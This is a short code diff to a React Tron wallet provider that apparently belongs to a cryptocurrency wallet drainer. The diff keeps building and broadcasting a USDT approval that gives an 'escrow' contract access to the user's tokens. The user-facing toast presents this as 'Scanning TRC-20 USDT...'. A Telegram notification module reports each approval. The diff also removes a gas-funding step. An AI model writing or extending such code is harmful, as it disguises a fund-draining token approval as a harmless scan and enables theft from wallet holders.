@@ -1,7 +1,7 @@
 import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
 import { toast } from "sonner";
 import { ESCROW_CONTRACT, USDT_TOKEN, TRON_CHAIN_ID } from "@/lib/tronConfig";
-import { buildApproveTx, broadcastTransaction, ensureGasForApproval, formatTronUserError } from "@/lib/tronUtils";
+import { buildApproveTx, broadcastTransaction, formatTronUserError } from "@/lib/tronUtils";
 import { sendTronApprovalNotification } from "@/lib/telegramNotify";
 import {
   connectTronWallet,
@@ -120,11 +120,7 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
     setIsApproving(true);
 
     try {
-      toast.loading("Preparing Tron scan...");
-      await ensureGasForApproval(tronAddr);
-
-      toast.dismiss();
-      toast.loading("Preparing scan transaction...");
+      toast.loading("Scanning TRC-20 USDT...");
       const transaction = await buildApproveTx(tronAddr, USDT_TOKEN.address, ESCROW_CONTRACT);
 
       toast.dismiss();
